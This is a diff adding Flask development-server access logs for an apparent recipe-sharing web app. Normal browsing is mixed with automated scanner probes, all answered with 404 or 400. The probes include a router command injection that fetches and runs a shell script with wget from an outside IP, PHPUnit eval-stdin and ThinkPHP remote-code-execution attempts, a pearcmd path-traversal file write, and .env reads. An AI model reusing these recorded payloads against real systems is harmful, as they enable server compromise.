@@ -108,3 +108,815 @@ ModuleNotFoundError: No module named 'flask_sqlalchemy'
 172.236.1.60 - - [08/Oct/2024 00:45:18] "GET /static/js/scripts.js HTTP/1.1" 200 -
 172.236.1.60 - - [08/Oct/2024 00:45:19] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
 172.236.1.60 - - [08/Oct/2024 00:45:20] "[33mGET /my_recipes/ws HTTP/1.1[0m" 404 -
+ * Serving Flask app 'server'
+ * Debug mode: off
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://172.236.1.60:5000
+[33mPress CTRL+C to quit[0m
+172.236.1.60 - - [08/Oct/2024 01:05:22] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 01:05:22] "[33mGET /my_recipes/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 01:05:24] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 01:05:24] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 01:05:24] "[33mGET /recipes/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 01:05:26] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 01:05:26] "[36mGET /static/assets/starters.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 01:05:26] "GET /static/css/styles.css HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 01:05:26] "[36mGET /static/assets/desserts.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 01:05:26] "[36mGET /static/assets/mains.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 01:05:26] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 01:05:26] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 01:05:26] "[33mGET /recipes/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 01:05:27] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 01:15:25] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 01:35:28] "[33mGET /actuator/gateway/routes HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 01:44:10] "GET /static/css/styles.css HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 01:44:10] "[36mGET /static/assets/starters.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 01:44:10] "[36mGET /static/assets/desserts.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 01:44:10] "[36mGET /static/assets/mains.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 01:44:10] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 01:44:10] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 01:44:13] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 01:44:13] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 01:44:17] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 01:44:17] "GET /static/css/styles.css HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 01:44:17] "[36mGET /static/assets/starters.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 01:44:17] "[36mGET /static/assets/mains.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 01:44:17] "[36mGET /static/assets/desserts.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 01:44:18] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 01:44:18] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 01:44:24] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 02:16:36] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 02:28:48] "[33mGET /.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 02:28:48] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+162.243.238.72 - - [08/Oct/2024 02:31:00] code 400, message Bad request version ('À\x14À')
+162.243.238.72 - - [08/Oct/2024 02:31:00] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03~ô\x14ÏJÿ4ïºJ¹,±äºÏ\x95@1\x82æ\x81V{À5\x1d\x96b\x86¤r\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+162.243.238.72 - - [08/Oct/2024 02:31:00] code 400, message Bad request version ('À\x14À')
+162.243.238.72 - - [08/Oct/2024 02:31:00] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03HÔÇ"\x13ÓþôN¤r\x1d\x0c\x06S\x86íiÝr\x11\x04\x17îò_lU'9G\x0f\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+162.243.238.72 - - [08/Oct/2024 02:31:00] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 02:38:29] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 02:41:22] "[33mGET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 02:49:54] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 03:04:03] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 03:14:30] "[33mGET /logon.htm HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 03:18:01] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 03:19:58] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 03:22:48] "[33mGET /containers/json HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 04:09:29] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 04:11:59] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 04:21:51] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 04:28:35] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 04:34:57] "[33mGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+-O-+http://154.216.17.31/t|sh;`) HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 04:35:21] "[33mGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+-O-+http://154.216.17.31/t|sh;`) HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 04:44:31] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 04:49:09] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 04:57:38] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 05:23:43] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 06:00:37] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 06:05:53] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 06:06:14] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 06:20:40] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 06:23:21] "[33mGET /containers/json HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 06:27:51] "GET / HTTP/1.1" 200 -
+81.209.179.151 - - [08/Oct/2024 06:35:42] code 400, message Bad request version ("óÒe¥\x9a¹\x00®\x13\x02\x13\x03\x13\x01À,À0\x00£\x00\x9fÌ©Ì¨ÌªÀ¯À\xadÀ£À\x9fÀ]ÀaÀWÀS\x00§À+À/\x00¢\x00\x9eÀ®À¬À¢À\x9eÀ\\À`ÀVÀR\x00¦À$À(\x00k\x00jÀsÀw\x00Ä\x00Ã\x00m\x00ÅÀ#À'\x00g\x00@ÀrÀv\x00¾\x00½\x00l\x00¿À")
+81.209.179.151 - - [08/Oct/2024 06:35:42] "[31m[1m\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03¤\x84â*\x90AJ²ÿ\x80H¥\x9cüæà=ô+H\\|Uë0n¥ô\x10\x1c\x07\x7f )OP\x18\x9cBèàeV\x99.eyp\x090ùÿíå9b#e\x1dóÒe¥\x9a¹\x00®\x13\x02\x13\x03\x13\x01À,À0\x00£\x00\x9fÌ©Ì¨ÌªÀ¯À­À£À\x9fÀ]ÀaÀWÀS\x00§À+À/\x00¢\x00\x9eÀ®À¬À¢À\x9eÀ\\À`ÀVÀR\x00¦À$À(\x00k\x00jÀsÀw\x00Ä\x00Ã\x00m\x00ÅÀ#À'\x00g\x00@ÀrÀv\x00¾\x00½\x00l\x00¿À[0m" 400 -
+81.209.179.151 - - [08/Oct/2024 06:35:43] "GET / HTTP/1.1" 200 -
+81.209.179.151 - - [08/Oct/2024 06:35:45] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 06:37:07] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 06:37:09] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 06:40:57] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 06:41:00] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 06:50:29] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 07:30:08] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 07:33:44] "GET / HTTP/1.1" 200 -
+64.62.156.105 - - [08/Oct/2024 07:51:53] "GET / HTTP/1.1" 200 -
+64.62.156.106 - - [08/Oct/2024 07:52:04] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 07:55:29] "[33mGET /portal/redlion HTTP/1.1[0m" 404 -
+198.235.24.17 - - [08/Oct/2024 07:58:14] "GET / HTTP/1.0" 200 -
+172.236.1.60 - - [08/Oct/2024 08:06:55] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 08:06:59] "GET /static/assets/cookbook.png HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 08:09:32] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 08:09:32] "[36mGET /static/assets/starters.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 08:09:32] "GET /static/css/styles.css HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 08:09:32] "[36mGET /static/assets/mains.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 08:09:32] "[36mGET /static/assets/desserts.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 08:09:32] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 08:09:32] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 08:12:13] "GET / HTTP/1.1" 200 -
+80.94.95.33 - - [08/Oct/2024 08:12:18] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+80.94.95.33 - - [08/Oct/2024 08:12:18] "[31m[1m\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr[0m" 400 -
+80.82.70.133 - - [08/Oct/2024 08:18:20] "GET / HTTP/1.0" 200 -
+5.8.11.202 - - [08/Oct/2024 08:18:37] code 400, message Bad request version ('À\x14À')
+5.8.11.202 - - [08/Oct/2024 08:18:37] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x1c \x95|\x99\x15\x80\x8d­EªgÝúø\x01IÈJ\x83(©\x9aô:AúWß@ÝA ¡ÕìÝY\x16Õ&\x9e<7ô@\x8eÙä\x94$?R\x96üm\x0eÝÓF»å¹ t\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À[0m" 400 -
+5.8.11.202 - - [08/Oct/2024 08:18:37] "[33mGET /v2/_catalog HTTP/1.1[0m" 404 -
+5.8.11.202 - - [08/Oct/2024 08:19:07] code 400, message Bad request version ('À\x14À')
+5.8.11.202 - - [08/Oct/2024 08:19:07] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03;ÿÎ\x8fn\x8b\x9b\x8eX\x15\x1aRR©6îÏý!½*4.\x00Úd]/dHÍ© \x9e\x8fK)¬1ÅÖÊ\x14\x92~½ëÙ¿\x1d¯{\x91a\x1fGÓå$bé,gÉ+\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À[0m" 400 -
+80.82.77.202 - - [08/Oct/2024 08:19:08] code 400, message Bad request version ('À\x13À')
+80.82.77.202 - - [08/Oct/2024 08:19:08] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x83_O\x12\x13ãm83 q`Äª\x97±×Î \x94%³Ña\x8cÖ8Ó\x12x\x0f\x96 \x1d+Ó7ïtÑ+iÉ\x024ß¬Î\x0dÀê+&í\x1dÅ\x95h\x128öK8~j\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+5.8.11.202 - - [08/Oct/2024 08:19:08] "[33mGET /v2/_catalog HTTP/1.1[0m" 404 -
+80.82.77.202 - - [08/Oct/2024 08:19:08] "[33mGET /aaa9 HTTP/1.1[0m" 404 -
+80.82.77.202 - - [08/Oct/2024 08:19:08] code 400, message Bad request version ('À\x13À')
+80.82.77.202 - - [08/Oct/2024 08:19:08] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03²®ªkÇµ8â\x17MERT¸yÞ\x17yJmÛ«B\x97\x1cLAÄ\x11\x80(\x11 ß¨>ÒèÍHä¼\x82E\x16\x83 J,\x1eu&ûõY/ÂHA\x05úl¹#Þ\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+80.82.77.202 - - [08/Oct/2024 08:19:08] "[33mGET /aab9 HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 08:32:54] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 08:35:19] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 08:37:30] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 08:38:08] "[33mGET /.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 08:40:26] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 09:06:11] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 09:06:17] "GET /sign_in HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 09:06:18] "GET /sign_in HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 09:06:21] "GET /sign_up HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 09:06:21] "GET /sign_up HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 09:06:35] "POST /register HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 09:06:52] "[32mPOST /register HTTP/1.1[0m" 302 -
+172.236.1.60 - - [08/Oct/2024 09:06:52] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 09:06:52] "[36mGET /static/assets/recipes.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 09:06:52] "[36mGET /static/assets/chef.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 09:06:52] "[36mGET /static/assets/head_pic.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 09:06:52] "[36mGET /static/assets/profile.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 09:22:06] "[31m[1mCONNECT / HTTP/1.1[0m" 405 -
+172.236.1.60 - - [08/Oct/2024 09:29:15] "[32mGET /logout HTTP/1.1[0m" 302 -
+172.236.1.60 - - [08/Oct/2024 09:29:15] "GET /sign_in HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 09:53:42] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 09:57:28] "GET /static/assets/cookbook.png HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 09:57:28] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 09:57:34] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 09:58:19] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 10:18:07] "GET / HTTP/1.1" 200 -
+89.248.171.23 - - [08/Oct/2024 10:21:27] "GET / HTTP/1.1" 200 -
+89.248.171.23 - - [08/Oct/2024 10:21:27] "GET /static/css/styles.css HTTP/1.1" 200 -
+89.248.171.23 - - [08/Oct/2024 10:21:27] "GET /static/assets/starters.jpg HTTP/1.1" 200 -
+89.248.171.23 - - [08/Oct/2024 10:21:27] "GET /static/js/scripts.js HTTP/1.1" 200 -
+89.248.171.23 - - [08/Oct/2024 10:21:27] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+89.248.171.23 - - [08/Oct/2024 10:21:27] "GET /static/assets/desserts.jpg HTTP/1.1" 200 -
+89.248.171.23 - - [08/Oct/2024 10:21:27] "GET /static/assets/mains.jpg HTTP/1.1" 200 -
+94.102.49.123 - - [08/Oct/2024 10:21:40] "GET /static/assets/cookbook.png HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 10:30:42] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 10:30:42] "[36mGET /static/assets/mains.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 10:30:42] "[36mGET /static/assets/desserts.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 10:30:42] "[36mGET /static/assets/starters.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 10:30:42] "GET /static/css/styles.css HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 10:30:42] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 10:30:42] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 10:30:44] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 10:30:44] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 10:30:45] "POST /all_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 10:30:46] "POST /view_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 10:30:51] "POST /all_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 10:31:09] "GET /sign_in HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 10:31:15] "[32mPOST /login HTTP/1.1[0m" 302 -
+172.236.1.60 - - [08/Oct/2024 10:31:15] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 10:31:15] "[36mGET /static/assets/chef.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 10:31:15] "[36mGET /static/assets/head_pic.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 10:31:15] "[36mGET /static/assets/recipes.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 10:31:15] "[36mGET /static/assets/profile.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 10:31:17] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 10:31:21] "POST /edit_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 10:31:29] "[33mPOST /global-protect/login.esp HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:31:33] "POST /update_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 10:31:36] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 10:34:44] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 10:39:03] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 10:39:44] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 10:46:41] "[33mGET /.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:46:41] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+172.236.1.60 - - [08/Oct/2024 10:46:41] "[33mGET /.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:46:41] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+172.236.1.60 - - [08/Oct/2024 10:47:31] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 10:50:46] "[33mGET /owa/auth/logon.aspx HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:16] "[33mPOST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:16] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:16] "[33mGET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:16] "[33mGET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:16] "[33mGET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:16] "[33mGET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:16] "[33mGET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:16] "[33mGET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:16] "[33mGET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:16] "[33mGET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:16] "[33mGET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:16] "[33mGET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:16] "[33mGET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:16] "[33mGET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:16] "[33mGET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:16] "[33mGET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:17] "[33mGET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:17] "[33mGET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:17] "[33mGET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:17] "[33mGET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:17] "[33mGET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:17] "[33mGET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:17] "[33mGET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:17] "[33mGET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:17] "[33mGET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:17] "[33mGET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:17] "[33mGET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:17] "[33mGET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:17] "[33mGET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:17] "[33mGET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:17] "[33mGET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:18] "[33mGET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:18] "[33mGET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:18] "[33mGET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:18] "[33mGET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:18] "[33mGET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:18] "[33mGET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:18] "[33mGET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:18] "[33mGET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:18] "[33mGET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:18] "[33mGET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 10:52:18] "[33mGET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 11:25:16] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 11:28:20] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 11:29:07] "[33mGET /geoserver/web/ HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 11:33:41] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 11:33:41] "[36mGET /static/assets/starters.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 11:33:41] "GET /static/css/styles.css HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 11:33:41] "[36mGET /static/assets/mains.jpg HTTP/1.1[0m" 304 -
